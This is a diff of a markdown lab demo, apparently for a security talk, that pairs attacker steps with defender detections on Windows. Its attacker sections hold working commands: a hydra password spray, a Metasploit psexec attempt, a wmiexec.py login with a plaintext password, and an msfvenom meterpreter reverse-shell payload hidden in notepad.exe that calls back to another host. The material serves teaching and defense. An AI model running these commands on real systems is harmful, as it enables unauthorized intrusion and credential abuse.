@@ -1,19 +1,22 @@
 # Demo
 
 ## Attacker launches password spray
-**Attacker**:
+
+### Attacker
 
 Password spray: `hydra -L users.txt -P seasons-2023.txt 192.168.37.237 smb -u`
 
 <img width="774" alt="hydra" src="https://github.com/eric-conrad/c2-talk/assets/14989334/5889e132-8050-4136-a7a2-90c7fe344872">
 
-**Defender**: Count successful (4624) and failed (4625) logins:
+### Defender 
+
+Count successful (4624) and failed (4625) logins:
 
 `Get-WinEvent -Path C:\labs\valkyrie-security-logons.evtx | Group-Object id -NoElement | sort count`
 
-## Attacker uses sprayed credentials to log in via Metasplot's psexec
+## Attacker uses sprayed credentials to attempt to log in via Metasplot's psexec
 
-**Attacker**
+### Attacker
 
 ```
 msfconsole
@@ -26,7 +29,7 @@ msf6 > exploit
 
 <img width="540" alt="image" src="https://github.com/eric-conrad/c2-talk/assets/14989334/33b73450-2f72-4154-adb8-e4df73605205">
 
-**Defender**
+### Defender
 
 Service was created (before Defender killed it):
 
@@ -42,13 +45,16 @@ Windows Defender Antivirus killed the connection:
 
 ## Attacker logs in with wmiexec.py:
 
+### Attacker
 `wmiexec.py fgaeta:W1nter2023\!@192.168.37.237`
 
 <img width="558" alt="image" src="https://github.com/eric-conrad/c2-talk/assets/14989334/8d7f5896-91be-41d1-9b31-ac312b38ddd4">
 
+### Defender
+
 ## Attacker creates plan.exe with msfvenom:
 
-**Attacker**
+### Attacker
 
 `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.37.203 LPORT=8080 -x notepad.exe -f exe > plan.exe`
 
@@ -56,7 +62,7 @@ Attacker uploads `plan.exe` via wmiexex.py's `lput`, tries to run it, and fails:
 
 <img width="495" alt="image" src="https://github.com/eric-conrad/c2-talk/assets/14989334/4fd06aff-b3eb-4104-9fb8-20f0b9436408">
 
-**Defender**
+### Defender
 
 The command executed:
 
